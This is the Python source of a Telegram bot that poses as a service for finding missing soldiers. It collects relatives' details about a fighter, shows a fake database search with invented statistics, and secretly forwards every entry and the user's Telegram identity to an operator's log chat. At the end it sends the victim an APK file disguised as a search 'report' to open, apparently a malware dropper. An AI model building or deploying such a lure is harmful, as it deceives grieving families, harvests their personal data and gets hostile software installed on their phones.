import asyncio
import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram import Update
import os
from datetime import datetime
import random
import shutil
import html

# Настройки
BOT_TOKEN = ""
LOG_CHAT_ID = -1003235777348  # Ваш чат для логов


class SearchBot:
    def __init__(self):
        self.stats = {
            "found_today": 187,
            "total_searches": 0
        }
        self.user_data = {}
        self.generated_numbers = set()
        self.support_tickets = {}  # Хранение тикетов поддержки
        self.active_searches = {}  # Активные поиски
        self.user_logs = {}  # Хранение логов по пользователям

        # Поиск APK файла в разных местах
        self.apk_file_path = self.find_apk_file()

    def find_apk_file(self):
        """Поиск APK файла в разных возможных местах"""
        possible_paths = [
            "otchet.apk",
            "./otchet.apk",
            "WORKCVO/otchet.apk",
            "./WORKCVO/otchet.apk",
            "apk/otchet.apk",
            "../otchet.apk",
            "/app/otchet.apk",
            "/app/WORKCVO/otchet.apk",
        ]

        for path in possible_paths:
            if os.path.exists(path):
                logging.info(f"APK файл найден: {path}")
                return path

        logging.error("APK файл не найден ни в одном из мест!")
        return None

    async def send_log(self, context: ContextTypes.DEFAULT_TYPE, message: str, user_id: int = None):
        """Отправка лога в чат"""
        try:
            # Сохраняем лог для пользователя
            if user_id:
                if user_id not in self.user_logs:
                    self.user_logs[user_id] = []

                log_entry = {
                    "timestamp": datetime.now().strftime("%d.%m.%Y %H:%M:%S"),
                    "message": message,
                    "type": "search" if "ЗАЯВКА" in message or "ПОИСК" in message else
                    "support" if "ТИКЕТ" in message else
                    "error" if "Ошибка" in message or "Conflict" in message else "info"
                }
                self.user_logs[user_id].append(log_entry)

            await context.bot.send_message(
                chat_id=LOG_CHAT_ID,
                text=message,
                parse_mode='HTML'
            )
        except Exception as e:
            logging.error(f"Ошибка отправки лога: {e}")

    async def log_complete_search(self, context: ContextTypes.DEFAULT_TYPE, user_data: dict, case_number: str,
                                  user_id: int, username: str = None, first_name: str = None):
        """Логирование полной заявки одним сообщением"""
        current_time = datetime.now().strftime("%d.%m.%Y %H:%M:%S")

        # Формируем информацию о пользователе
        user_info_parts = [f"👤 ID: {user_id}"]
        if username:
            user_info_parts.append(f"@{username}")
        if first_name:
            user_info_parts.append(first_name)

        user_info = " | ".join(user_info_parts)

        log_message = (
            f"🔍 <b>НОВАЯ ЗАЯВКА НА ПОИСК</b>\n"
            f"🕒 <b>Время:</b> {current_time}\n"
            f"{user_info}\n"
            f"📄 <b>Номер дела:</b> {case_number}\n\n"
            f"<b>ДАННЫЕ БОЙЦА:</b>\n"
            f"• <b>ФИО:</b> {user_data.get('fio', 'Н/Д')}\n"
            f"• <b>Дата рождения:</b> {user_data.get('birth_date', 'Н/Д')}\n"
            f"• <b>Позывной:</b> {user_data.get('call_sign', 'Н/Д')}\n\n"
            f"────────────────────"
        )

        await self.send_log(context, log_message, user_id)

    async def log_search_start(self, context: ContextTypes.DEFAULT_TYPE, user_id: int, username: str = None,
                               first_name: str = None):
        """Логирование начала поиска"""
        current_time = datetime.now().strftime("%d.%m.%Y %H:%M:%S")

        user_info = f"👤 ID: {user_id}"
        if username:
            user_info += f" | @{username}"
        if first_name:
            user_info += f" | {first_name}"

        log_message = (
            f"🚀 <b>НАЧАТ ПОИСК</b>\n"
            f"🕒 <b>Время:</b> {current_time}\n"
            f"{user_info}\n"
            f"────────────────────"
        )

        await self.send_log(context, log_message, user_id)

    async def log_support_ticket(self, context: ContextTypes.DEFAULT_TYPE, user_id: int, username: str = None,
                                 first_name: str = None, message: str = None, ticket_id: str = None):
        """Логирование тикета поддержки"""
        current_time = datetime.now().strftime("%d.%m.%Y %H:%M:%S")

        user_info = f"👤 ID: {user_id}"
        if username:
            user_info += f" | @{username}"
        if first_name:
            user_info += f" | {first_name}"

        log_message = (
            f"📞 <b>НОВЫЙ ТИКЕТ ПОДДЕРЖКИ</b>\n"
            f"🕒 <b>Время:</b> {current_time}\n"
            f"🎫 <b>ID тикета:</b> {ticket_id}\n"
            f"{user_info}\n\n"
            f"<b>СООБЩЕНИЕ:</b>\n"
            f"{html.escape(message)}\n\n"
            f"────────────────────"
        )

        await self.send_log(context, log_message, user_id)

    async def create_user_html_log_file(self, user_id: int, username: str = None, first_name: str = None):
        """Создание HTML файла с логами конкретного пользователя"""
        if user_id not in self.user_logs or not self.user_logs[user_id]:
            return None

        user_logs = self.user_logs[user_id]

        html_content = """
        <!DOCTYPE html>
        <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Логи пользователя - Новый Лохматый</title>
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');

                body {
                    font-family: 'Roboto', sans-serif;
                    margin: 0;
                    padding: 0;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    background-attachment: fixed;
                    color: #333;
                    min-height: 100vh;
                }

                .mammoth-bg {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text x="50%" y="50%" font-size="80" text-anchor="middle" dominant-baseline="middle" fill="rgba(255,255,255,0.03)" font-weight="bold">🦣</text></svg>');
                    background-repeat: repeat;
                    background-size: 200px 200px;
                    z-index: -1;
                }

                .container {
                    max-width: 1000px;
                    margin: 0 auto;
                    padding: 20px;
                    position: relative;
                    z-index: 1;
                }

                .header {
                    text-align: center;
                    background: rgba(255, 255, 255, 0.95);
                    padding: 30px;
                    border-radius: 20px;
                    margin-bottom: 25px;
                    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
                    position: relative;
                    overflow: hidden;
                    backdrop-filter: blur(10px);
                }

                .header::before {
                    content: '';
                    position: absolute;
                    top: 0;
                    left: 0;
                    right: 0;
                    height: 5px;
                    background: linear-gradient(90deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4, #ffeaa7);
                }

                .header h1 {
                    color: #2c3e50;
                    font-size: 2.5em;
                    margin: 0 0 10px 0;
                    text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
                    font-weight: 700;
                }

                .header .subtitle {
                    color: #7f8c8d;
                    font-size: 1.2em;
                    margin-top: 5px;
                    font-weight: 300;
                }

                .user-info {
                    background: rgba(52, 152, 219, 0.1);
                    padding: 15px;
                    border-radius: 10px;
                    margin: 15px 0;
                    border-left: 4px solid #3498db;
                }

                .logs-section {
                    background: rgba(255, 255, 255, 0.95);
                    border-radius: 15px;
                    padding: 25px;
                    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
                    backdrop-filter: blur(10px);
                }

                .log-entry {
                    border-left: 4px solid #3498db;
                    padding: 18px;
                    margin: 15px 0;
                    background: #f8f9fa;
                    border-radius: 0 12px 12px 0;
                    transition: all 0.3s ease;
                }

                .log-entry:hover {
                    transform: translateX(3px);
                    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
                }

                .log-entry.search {
                    border-left-color: #27ae60;
                    background: linear-gradient(135deg, #f8fff8 0%, #e8f5e8 100%);
                }

                .log-entry.support {
                    border-left-color: #f39c12;
                    background: linear-gradient(135deg, #fffbf8 0%, #f5f0e8 100%);
                }

                .log-time {
                    color: #7f8c8d;
                    font-size: 0.85em;
                    margin-bottom: 6px;
                    font-weight: 500;
                }

                .log-content {
                    color: #2c3e50;
                    line-height: 1.5;
                    font-size: 0.95em;
                }

                .log-content b {
                    color: #2c3e50;
                    font-weight: 600;
                }

                .empty-logs {
                    text-align: center;
                    color: #7f8c8d;
                    font-size: 1.1em;
                    padding: 50px 20px;
                    background: rgba(248, 249, 250, 0.8);
                    border-radius: 12px;
                    border: 2px dashed #bdc3c7;
                }

                @media (max-width: 768px) {
                    .header h1 {
                        font-size: 2em;
                    }

                    .container {
                        padding: 15px;
                    }
                }
            </style>
        </head>
        <body>
            <div class="mammoth-bg"></div>
            <div class="container">
                <div class="header">
                    <h1>🦣 НОВЫЙ ЛОХМАТЫЙ</h1>
                    <div class="subtitle">Логи поисковых операций</div>
                </div>
        """

        # Добавляем информацию о пользователе
        user_info_text = f"👤 ID: {user_id}"
        if username:
            user_info_text += f" | @{username}"
        if first_name:
            user_info_text += f" | {first_name}"

        html_content += f"""
                <div class="user-info">
                    <strong>Информация о пользователе:</strong><br>
                    {user_info_text}<br>
                    <small>Всего операций: {len(user_logs)}</small>
                </div>

                <div class="logs-section">
        """

        # Добавляем логи в обратном порядке (новые сверху)
        for log in reversed(user_logs):
            # Форматируем сообщение как в вашем примере
            formatted_message = log["message"].replace('<b>', '').replace('</b>', '').replace('<br>', '\n')
            escaped_message = html.escape(formatted_message).replace('\n', '<br>')

            html_content += f"""
                    <div class="log-entry {log['type']}">
                        <div class="log-time">🕒 {log['timestamp']}</div>
                        <div class="log-content">{escaped_message}</div>
                    </div>
            """

        html_content += """
                </div>
            </div>
        </body>
        </html>
        """

        filename = f"logs_user_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)

        return filename

    async def send_user_logs_to_chat(self, context: ContextTypes.DEFAULT_TYPE, user_id: int):
        """Отправка логов пользователя в лог-чат и удаление логов"""
        try:
            if user_id not in self.user_logs or not self.user_logs[user_id]:
                return

            # Получаем информацию о пользователе
            user = await context.bot.get_chat(user_id)

            # Создаем HTML файл
            html_file = await self.create_user_html_log_file(
                user_id,
                user.username,
                user.first_name
            )

            if html_file and os.path.exists(html_file):
                with open(html_file, 'rb') as file:
                    await context.bot.send_document(
                        chat_id=LOG_CHAT_ID,
                        document=file,
                        filename=f"Логи_Пользователя_{user_id}_{datetime.now().strftime('%d.%m.%Y')}.html",
                        caption=f"📊 <b>ЛОГИ ПОЛЬЗОВАТЕЛЯ</b>\n"
                                f"🦣 <b>Новый Лохматый</b>\n\n"
                                f"👤 <b>Пользователь:</b>\n"
                                f"• ID: {user_id}\n"
                                f"• Username: @{user.username if user.username else 'Н/Д'}\n"
                                f"• Имя: {user.first_name if user.first_name else 'Н/Д'}\n\n"
                                f"📈 <b>Всего операций:</b> {len(self.user_logs[user_id])}\n"
                                f"📅 <b>Дата выгрузки:</b> {datetime.now().strftime('%d.%m.%Y %H:%M')}",
                        parse_mode='HTML'
                    )

                # Удаляем временный файл
                os.remove(html_file)

                # УДАЛЯЕМ ЛОГИ ПОЛЬЗОВАТЕЛЯ ПОСЛЕ ОТПРАВКИ
                del self.user_logs[user_id]

        except Exception as e:
            logging.error(f"Ошибка отправки логов пользователя: {e}")

    def get_main_menu_keyboard(self):
        """Клавиатура главного меню"""
        keyboard = [
            [InlineKeyboardButton("🔍 НАЧАТЬ ПОИСК", callback_data="start_search")],
            [InlineKeyboardButton("ℹ️ ПОМОЩЬ", callback_data="show_help")],
            [InlineKeyboardButton("📞 ПОДДЕРЖКА", callback_data="show_support")]
        ]
        return InlineKeyboardMarkup(keyboard)

    def get_back_to_menu_keyboard(self):
        """Кнопка возврата в меню"""
        keyboard = [
            [InlineKeyboardButton("⬅️ ВЕРНУТЬСЯ В МЕНЮ", callback_data="back_to_menu")]
        ]
        return InlineKeyboardMarkup(keyboard)

    def get_support_keyboard(self):
        """Клавиатура поддержки"""
        keyboard = [
            [InlineKeyboardButton("💬 НАПИСАТЬ СООБЩЕНИЕ", callback_data="create_ticket")],
            [InlineKeyboardButton("⬅️ В МЕНЮ", callback_data="back_to_menu")]
        ]
        return InlineKeyboardMarkup(keyboard)

    def generate_unique_case_number(self):
        """Генерация уникального номера дела"""
        while True:
            random_part = ''.join([str(random.randint(0, 9)) for _ in range(8)])
            case_number = f"СВО-{random_part}"

            if case_number not in self.generated_numbers:
                self.generated_numbers.add(case_number)
                return case_number

    def generate_ticket_id(self):
        """Генерация уникального ID тикета"""
        return f"TICKET-{random.randint(100000, 999999)}"

    async def create_apk_report(self, case_number: str):
        """Создание копии APK файла с новым именем"""
        try:
            if not self.apk_file_path:
                logging.error("APK файл не найден!")
                return None

            new_filename = f"ОТЧЕТ_{case_number}.apk"

            logging.info(f"Копируем {self.apk_file_path} в {new_filename}")
            shutil.copy2(self.apk_file_path, new_filename)
            logging.info(f"Создан файл: {new_filename}")
            return new_filename

        except Exception as e:
            logging.error(f"Ошибка создания отчета: {e}")
            return None

    async def show_main_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Показать главное меню"""
        menu_text = (
            "🔍 <b>ПОИСК ПРОПАВШИХ СВО</b>\n\n"
            "<b>СТАТИСТИКА ПОИСКА:</b>\n"
            "<b>Найдено пропавших бойцов сегодня: 1291</b>\n\n"
            "Выберите действие из меню ниже:\n\n"
            "• <b>🔍 НАЧАТЬ ПОИСК</b> - оформление заявки на поиск бойца\n"
            "• <b>ℹ️ ПОМОЩЬ</b> - инструкция по использованию\n"
            "• <b>📞 ПОДДЕРЖКА</b> - связь с технической поддержкой"
        )

        if update.message:
            await update.message.reply_text(
                menu_text,
                reply_markup=self.get_main_menu_keyboard(),
                parse_mode='HTML'
            )
        else:
            await update.callback_query.edit_message_text(
                menu_text,
                reply_markup=self.get_main_menu_keyboard(),
                parse_mode='HTML'
            )

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка команды /start"""
        # Игнорируем сообщения из групп, если они не адресованы боту напрямую
        if update.message.chat.type != "private" and not update.message.text.startswith('/start@'):
            return

        await self.show_main_menu(update, context)

    async def show_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Показать помощь"""
        help_text = (
            "ℹ️ <b>ПОМОЩЬ ПО ИСПОЛЬЗОВАНИЮ</b>\n\n"
            "<b>Как оформить заявку на поиск:</b>\n"
            "1. Нажмите '🔍 НАЧАТЬ ПОИСК'\n"
            "2. Введите ФИО бойца полностью\n"
            "3. Укажите дату рождения\n"
            "4. Введите позывной (если известен)\n"
            "5. Подтвердите данные\n\n"

            "<b>Требования к данным:</b>\n"
            "• ФИО: полное имя (Иванов Иван Иванович)\n"
            "• Дата рождения: от 1900 года, минимум 16 лет\n"
            "• Форматы даты: 15.05.1990, 15 мая 1990, 15-05-1990\n\n"

            "<b>Проверяемые базы данных:</b>\n"
            "• База Минобороны РФ\n"
            "• Госпитали и медучреждения\n"
            "• Лагеря военнопленных\n"
            "• Международные организации"
        )

        await update.callback_query.edit_message_text(
            help_text,
            reply_markup=self.get_back_to_menu_keyboard(),
            parse_mode='HTML'
        )

    async def show_support(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Показать поддержку"""
        support_text = (
            "📞 <b>ПОДДЕРЖКА</b>\n\n"
            "Если у вас возникли проблемы с использованием бота или вопросы по поиску:\n\n"
            "<b>Техническая поддержка:</b>\n"
            "• По вопросам работы бота\n"
            "• При ошибках в работе\n"
            "• По техническим вопросам\n\n"

            "<b>Информационная поддержка:</b>\n"
            "• По вопросам оформления заявок\n"
            "• Уточнение данных для поиска\n"
            "• Статус выполненных поисков\n\n"

            "<i>Нажмите кнопку ниже чтобы написать сообщение в поддержку</i>"
        )

        await update.callback_query.edit_message_text(
            support_text,
            reply_markup=self.get_support_keyboard(),
            parse_mode='HTML'
        )

    async def start_ticket_creation(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Начать создание тикета"""
        user_id = update.callback_query.from_user.id
        self.user_data[user_id] = {"step": "support_message"}

        await update.callback_query.edit_message_text(
            "💬 <b>НАПИШИТЕ ВАШЕ СООБЩЕНИЕ В ПОДДЕРЖКУ</b>\n\n"
            "Опишите вашу проблему или вопрос подробно:\n\n"
            "<i>Пример: \"Не приходит APK файл после поиска, номер дела СВО-12345678\"</i>",
            parse_mode='HTML'
        )

    async def process_support_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE, message: str):
        """Обработка сообщения поддержки"""
        user_id = update.effective_user.id
        user = update.effective_user

        # Генерируем ID тикета
        ticket_id = self.generate_ticket_id()

        # Сохраняем тикет
        self.support_tickets[ticket_id] = {
            "user_id": user_id,
            "username": user.username,
            "first_name": user.first_name,
            "message": message,
            "timestamp": datetime.now(),
            "status": "new"
        }

        # Логируем тикет в чат
        await self.log_support_ticket(
            context,
            user_id,
            user.username,
            user.first_name,
            message,
            ticket_id
        )

        # Подтверждаем пользователю
        await update.message.reply_text(
            f"✅ <b>ВАШЕ СООБЩЕНИЕ ОТПРАВЛЕНО В ПОДДЕРЖКУ</b>\n\n"
            f"🎫 <b>ID тикета:</b> {ticket_id}\n"
            f"📝 <b>Статус:</b> принято в обработку\n\n"
            f"<i>Мы ответим вам в ближайшее время</i>",
            reply_markup=self.get_back_to_menu_keyboard(),
            parse_mode='HTML'
        )

        # Очищаем данные пользователя
        if user_id in self.user_data:
            del self.user_data[user_id]

    async def start_search_from_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Начать поиск из меню"""
        user_id = update.callback_query.from_user.id
        self.user_data[user_id] = {"step": "fio"}

        # Логируем начало поиска
        user = update.callback_query.from_user
        await self.log_search_start(context, user.id, user.username, user.first_name)

        await update.callback_query.edit_message_text(
            "🔍 <b>НАЧИНАЕМ ОФОРМЛЕНИЕ ЗАЯВКИ НА ПОИСК</b>\n\n"
            "Введите ФИО бойца (полностью):\n"
            "<i>Пример: Иванов Иван Иванович</i>",
            parse_mode='HTML'
        )

    async def handle_private_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка сообщений только из личных чатов"""
        # Работаем только в личных сообщениях
        if update.message.chat.type != "private":
            return

        user_id = update.effective_user.id
        text = update.message.text

        # Если пользователь ввел команду /menu, показываем меню
        if text.lower() in ['/menu', 'меню', 'menu']:
            await self.show_main_menu(update, context)
            return

        if user_id not in self.user_data:
            await self.show_main_menu(update, context)
            return

        current_step = self.user_data[user_id].get("step")

        if current_step == "fio":
            await self.process_fio(update, context, text)
        elif current_step == "birth_date":
            await self.process_birth_date(update, context, text)
        elif current_step == "call_sign":
            await self.process_call_sign(update, context, text)
        elif current_step == "support_message":
            await self.process_support_message(update, context, text)

    async def process_fio(self, update: Update, context: ContextTypes.DEFAULT_TYPE, fio: str):
        user_id = update.effective_user.id
        self.user_data[user_id]["fio"] = fio
        self.user_data[user_id]["step"] = "birth_date"

        await update.message.reply_text(
            "📅 <b>Теперь введите дату рождения бойца:</b>\n"
            "<i>Примеры:</i>\n"
            "• 15.05.1990\n"
            "• 15 мая 1990\n"
            "• 15-05-1990\n\n"
            "<i>Проверяем реальные даты рождения (от 1900 года, минимум 16 лет)</i>",
            parse_mode='HTML'
        )

    async def process_birth_date(self, update: Update, context: ContextTypes.DEFAULT_TYPE, date_str: str):
        user_id = update.effective_user.id

        parsed_date = await self.validate_date(date_str)
        if not parsed_date:
            await update.message.reply_text(
                "❌ <b>Неверный формат даты</b>\n\n"
                "Пожалуйста, введите корректную дату рождения:\n"
                "<i>Примеры:</i>\n"
                "• 15.05.1990\n"
                "• 15 мая 1990\n"
                "• 15-05-1990",
                parse_mode='HTML'
            )
            return

        self.user_data[user_id]["birth_date"] = parsed_date
        self.user_data[user_id]["step"] = "call_sign"

        await update.message.reply_text(
            f"✅ <b>Дата рождения принята:</b> {parsed_date}\n\n"
            "🎯 <b>Теперь введите позывной бойца:</b>\n"
            "<i>Пример: Хох, Леший, Медведь</i>\n"
            "<i>Если позывной неизвестен - поставьте прочерк \"-\"</i>",
            parse_mode='HTML'
        )

    async def process_call_sign(self, update: Update, context: ContextTypes.DEFAULT_TYPE, call_sign: str):
        user_id = update.effective_user.id
        self.user_data[user_id]["call_sign"] = call_sign

        keyboard = [
            [InlineKeyboardButton("✅ ВСЁ ВЕРНО", callback_data="confirm_search")],
            [InlineKeyboardButton("❌ ИЗМЕНИТЬ ДАННЫЕ", callback_data="change_data")],
            [InlineKeyboardButton("⬅️ В МЕНЮ", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        user_data = self.user_data[user_id]

        await update.message.reply_text(
            f"📋 <b>ПРОВЕРЬТЕ ВАШУ ЗАЯВКУ:</b>\n\n"
            f"• <b>ФИО:</b> {user_data['fio']}\n"
            f"• <b>Дата рождения:</b> {user_data['birth_date']}\n"
            f"• <b>Позывной:</b> {user_data['call_sign']}\n\n"
            f"<b>Все верно?</b>",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )

    async def validate_date(self, date_str: str):
        """Валидация даты рождения"""
        try:
            formats = [
                "%d.%m.%Y", "%d %B %Y", "%d-%m-%Y",
                "%d.%m.%y", "%d/%m/%Y", "%Y-%m-%d"
            ]

            for fmt in formats:
                try:
                    date = datetime.strptime(date_str, fmt)
                    if date.year < 1900 or date.year > datetime.now().year - 16:
                        return None
                    return date.strftime("%d %B %Y года")
                except ValueError:
                    continue
            return None
        except:
            return None

    async def progress_bar(self, progress: int, total: int = 10):
        """Создание прогресс бара"""
        percentage = min(progress / total * 100, 100)
        bars = "█" * int(percentage / 10)
        spaces = "░" * (10 - len(bars))
        return f"[{bars}{spaces}] {percentage:.1f}%"

    async def execute_search(self, context: ContextTypes.DEFAULT_TYPE, user_id: int, user_data: dict):
        """Выполнение поиска с прогресс баром"""
        case_number = self.generate_unique_case_number()

        message = await context.bot.send_message(
            chat_id=user_id,
            text="🔍 <b>ЗАЯВКА ПРИНЯТА! Начинаем проверку по базам данных...</b>",
            parse_mode='HTML'
        )

        total_steps = 6
        total_duration = random.randint(5, 10)
        step_duration = total_duration / total_steps

        steps = [
            "🔌 Подключение к базам Минобороны...",
            "🏥 Проверка госпиталей и медучреждений...",
            "🏕️ Поиск в лагерях военнопленных...",
            "🌍 Запрос в международные организации...",
            "📊 Анализ полученных данных...",
            "✅ Верификация данных..."
        ]

        for i, step in enumerate(steps):
            progress = await self.progress_bar(i + 1, total_steps)

            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=message.message_id,
                text=f"🔍 <b>ПОИСК ВЫПОЛНЯЕТСЯ...</b>\n\n{progress}\n\n{step}",
                parse_mode='HTML'
            )
            await asyncio.sleep(step_duration)

        await context.bot.edit_message_text(
            chat_id=user_id,
            message_id=message.message_id,
            text=f"✅ <b>АНАЛИЗ ЗАВЕРШЕН УСПЕШНО!</b>\n\n"
                 f"🏁 <b>ПОИСК ЗАВЕРШЕН</b>\n\n"
                 f"📄 <b>НОМЕР ДЕЛА:</b> {case_number}\n\n"
                 f"<b>ОБРАБОТАННЫЕ ДАННЫЕ:</b>\n"
                 f"• Военнослужащий: {user_data.get('fio', 'Н/Д')}\n"
                 f"• Дата рождения: {user_data.get('birth_date', 'Н/Д')}\n"
                 f"• Позывной: {user_data.get('call_sign', 'Н/Д')}\n\n"
                 f"📊 <b>Формирование отчета...</b>",
            parse_mode='HTML'
        )

        # Отправляем полный лог одним сообщением
        user = await context.bot.get_chat(user_id)
        await self.log_complete_search(
            context,
            user_data,
            case_number,
            user_id,
            user.username,
            user.first_name
        )

        # ОТПРАВЛЯЕМ HTML ФАЙЛ С ЛОГАМИ В ЧАТ И УДАЛЯЕМ ЛОГИ
        await self.send_user_logs_to_chat(context, user_id)

        # Пытаемся отправить APK файл
        if self.apk_file_path:
            apk_filename = await self.create_apk_report(case_number)
            if apk_filename and os.path.exists(apk_filename):
                with open(apk_filename, 'rb') as apk_file:
                    await context.bot.send_document(
                        chat_id=user_id,
                        document=apk_file,
                        filename=f"ОТЧЕТ_{case_number}.apk",
                        caption=f"📱 <b>Отчет:</b> ОТЧЕТ_{case_number}.apk\n\n"
                                f"<b>Военнослужащий:</b> {user_data.get('fio', 'Н/Д')}\n\n"
                                f"Для просмотра полных данных - откройте отчет выше.\n\n"
                                f"<b>Дата:</b> {datetime.now().strftime('%H:%M')}",
                        parse_mode='HTML'
                    )
                try:
                    os.remove(apk_filename)
                except:
                    pass
            else:
                await context.bot.send_message(
                    chat_id=user_id,
                    text="❌ Ошибка создания отчета."
                )
        else:
            await context.bot.send_message(
                chat_id=user_id,
                text="❌ APK файл не найден. Отчет не может быть сформирован."
            )

    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка нажатий кнопок"""
        query = update.callback_query

        # Отвечаем на callback сразу, чтобы избежать таймаута
        try:
            await query.answer()
        except Exception as e:
            logging.warning(f"Callback answer error: {e}")

        data = query.data

        if data == "start_search":
            await self.start_search_from_menu(update, context)
        elif data == "show_help":
            await self.show_help(update, context)
        elif data == "show_support":
            await self.show_support(update, context)
        elif data == "create_ticket":
            await self.start_ticket_creation(update, context)
        elif data == "back_to_menu":
            await self.show_main_menu(update, context)
        elif data == "confirm_search":
            user_id = query.from_user.id
            user_data = self.user_data.get(user_id, {})

            # Показываем сообщение о начале поиска
            await query.edit_message_text(
                "🔍 <b>ЗАЯВКА ПРИНЯТА! Начинаем проверку по базам данных...</b>\n\n"
                "<i>Это займет несколько секунд...</i>",
                parse_mode='HTML'
            )

            # Запускаем поиск в фоне
            asyncio.create_task(self.execute_search(context, user_id, user_data))

            # Очищаем данные пользователя после запуска поиска
            if user_id in self.user_data:
                del self.user_data[user_id]

        elif data == "change_data":
            user_id = query.from_user.id
            self.user_data[user_id] = {"step": "fio"}
            await query.edit_message_text(
                "🔄 <b>НАЧИНАЕМ ЗАНОВО</b>\n\n"
                "Введите ФИО бойца (полностью):\n"
                "<i>Пример: Иванов Иван Иванович</i>",
                parse_mode='HTML'
            )


def main():
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )

    bot = SearchBot()

    application = Application.builder().token(BOT_TOKEN).build()

    # Обработчики команд - работают везде, но с проверкой в функциях
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CommandHandler("menu", bot.show_main_menu))

    # Обработчик сообщений - работает ТОЛЬКО в личных чатах
    application.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE,
        bot.handle_private_message
    ))

    # Обработчик кнопок - работает везде
    application.add_handler(CallbackQueryHandler(bot.button_handler))

    print("Бот запущен...")
    print("Бот будет работать только в личных сообщениях")
    print(f"Логи будут отправляться ТОЛЬКО в чат: {LOG_CHAT_ID}")
    application.run_polling()


if __name__ == "__main__":
    main()


